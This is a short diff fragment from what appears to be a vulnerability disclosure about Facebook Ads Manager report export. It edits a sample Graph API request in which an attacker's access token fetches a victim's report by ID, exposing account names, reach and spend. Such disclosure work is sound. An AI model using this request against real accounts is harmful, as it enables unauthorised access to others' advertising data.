@@ -35,7 +35,7 @@ Using the Graph API or report download endpoints, an attacker could export Ads M
    The file will be returned in the attacker's session containing the exported report with account names, reach, amount spent, etc.
 5. Alternatively, use Graph API to fetch the report by ID:
    ```http
-   GET /{ID_report_length_16_victim}&access_token={TOKEN_Attacker} HTTP/1.1
+   GET /{ID_report}&access_token={TOKEN_Attacker} HTTP/1.1
    Host: graph.facebook.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
    Accept: */*
